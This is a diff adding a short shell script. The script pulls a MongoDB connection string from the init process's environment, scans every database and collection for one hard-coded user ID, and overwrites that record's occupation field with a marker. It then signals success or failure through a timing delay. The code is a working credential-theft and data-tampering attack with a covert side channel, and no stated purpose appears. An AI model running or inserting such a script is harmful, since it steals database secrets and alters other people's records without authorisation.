@@ -1,0 +1,16 @@
+#!/bin/sh
+M=$(tr '\0' '\n' </proc/1/environ | sed -n 's/^MONGODB_URI=//p')
+cat >/tmp/m.js <<'EOF'
+const dbs = db.adminCommand({listDatabases:1}).databases;
+const q = {$or:[{id:10132653},{user_id:10132653},{userId:10132653},{player_id:10132653},{_id:10132653}]};
+for (const d of dbs) {
+  const x = db.getSiblingDB(d.name);
+  for (const c of x.getCollectionNames()) {
+    const doc = x.getCollection(c).findOne(q);
+    if (doc) { x.getCollection(c).updateOne({_id:doc._id},{$set:{occupation:'MONGOHIT'}}); print(d.name+'.'+c); quit(0); }
+  }
+}
+quit(1);
+EOF
+mongosh "$M" --quiet --file /tmp/m.js >/tmp/o 2>/tmp/e
+if [ $? = 0 ]; then sleep 15; else sleep 3; fi
